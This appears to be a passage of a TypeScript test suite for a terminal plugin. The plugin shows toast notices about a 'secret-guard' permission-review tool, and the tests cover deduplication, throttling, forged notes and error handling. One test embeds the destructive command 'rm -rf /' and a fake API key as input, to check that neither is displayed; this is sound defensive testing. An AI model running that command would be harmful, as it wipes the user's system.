  test("observe would-allow is shown once per request", async () => {
    const message = await serverNote("observe", {});
    const { shown, listen } = toasts();
    listen(asked(message));
    listen(asked(message));
    listen(asked(message, "per_2"));
    expect(shown.map((toast) => toast.variant)).toEqual(["info", "info"]);
    expect(shown[0].message).toBe("Observe mode: Jev would allow this request. You are still asked.");
  });

  test("a repeated auth warning is quiet for a while, then returns", () => {
    const { shown, listen, advance } = toasts();
    const note = "secret-guard review: manual approval (auth-rejected): anything";
    listen(asked(note, "per_1"));
    listen(asked(note, "per_2"));
    expect(shown).toHaveLength(1);
    advance(REASON_QUIET_MS);
    listen(asked(note, "per_3"));
    expect(shown).toHaveLength(2);
  });

  test("ordinary reasons, foreign or forged text and malformed events show nothing", () => {
    const { shown, listen } = toasts();
    listen(asked("secret-guard review: manual approval (model-high-impact)"));
    listen(asked("secret-guard review: manual approval (constructor)", "per_2"));
    listen(asked("prefix secret-guard review: would allow (model-approved)", "per_3"));
    listen(asked("secret-guard review: would allow (Model Approved)", "per_4"));
    listen(asked(undefined, "per_5"));
    listen({ data: null } as any);
    listen(undefined as any);
    expect(shown).toEqual([]);
  });

  test("only reason-chosen text is shown, never the note's suffix", () => {
    const { shown, listen } = toasts();
    listen(asked("secret-guard review: manual approval (auth-not-key): rm -rf / sk-abcdefghijklmnopqrstu"));
    expect(JSON.stringify(shown)).not.toMatch(/rm -rf|sk-/);
  });

  test("a failing toast does not throw into the host", () => {
    const listen = createTuiListener({ toast: { show: () => { throw new Error("ui gone"); } } });
    expect(() => listen(asked("secret-guard review: would allow (model-approved)"))).not.toThrow();
  });

  test("setup subscribes to permission.asked and returns its unsubscribe", () => {
    const calls: string[] = [];
    const unsubscribe = () => calls.push("unsubscribed");
    const cleanup = tuiPlugin.setup({
      data: { on: (type: string) => (calls.push(type), unsubscribe) },
      ui: { toast: { show: () => {} } },
    } as any);
    expect(calls).toEqual(["permission.asked"]);
    cleanup();
    expect(calls).toEqual(["permission.asked", "unsubscribed"]);
  });
});
